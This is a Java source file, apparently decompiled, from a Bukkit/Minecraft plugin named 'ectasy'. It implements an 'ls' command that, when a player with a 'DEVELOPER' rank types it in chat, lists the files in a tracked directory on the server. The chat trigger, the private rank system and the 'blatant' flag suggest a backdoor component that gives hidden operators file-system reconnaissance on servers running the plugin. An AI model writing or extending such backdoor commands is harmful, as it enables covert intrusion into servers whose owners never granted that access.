package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.Vars;
import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Objects;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "ls",
   description = "List files",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {}
)
public class LsCommand extends AbstractCommand {

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      File var4 = new File(Vars.CURRENT_DIR);
      ArrayList<String> var5 = new ArrayList<String>();

      for(File var9 : Objects.requireNonNull(var4.listFiles())) {
         if (var9.isFile()) {
            var5.add(var9.getName());
         } else {
            var5.add("/" + var9.getName() + "/");
         }
      }

      Collections.sort(var5);
      var5.forEach(name -> ChatUtil.sendChat(var1.getPlayer(), name));
   }
}
